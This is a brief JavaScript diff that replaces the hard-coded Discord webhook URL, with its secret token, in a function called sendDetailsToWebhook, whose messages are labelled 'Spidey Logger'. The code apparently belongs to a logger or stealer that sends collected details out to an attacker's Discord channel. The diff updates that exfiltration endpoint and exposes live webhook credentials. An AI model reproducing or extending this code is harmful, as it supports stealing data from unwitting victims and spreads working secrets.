@@ -1,5 +1,5 @@
 function sendDetailsToWebhook(details) {
-    const webhookUrl = 'https://ptb.discord.com/api/webhooks/1257993219485077628/foypbWcAqqIUEzUgBYZd3K-fISh-TIvH8jNtL_-k3Vlhj0A2ZxCHGM1j_AXjsUo3GwH5';
+    const webhookUrl = 'https://ptb.discord.com/api/webhooks/1264643873301467196/KCAA3ZHeGFcXKyXWKOYxJjo3UWZ0tma9Kx_UJuKs_IbIXpC3hFGDSc7NVFdAtXLT2HWx';
 
     const params = {
         username: "Spidey Logger",
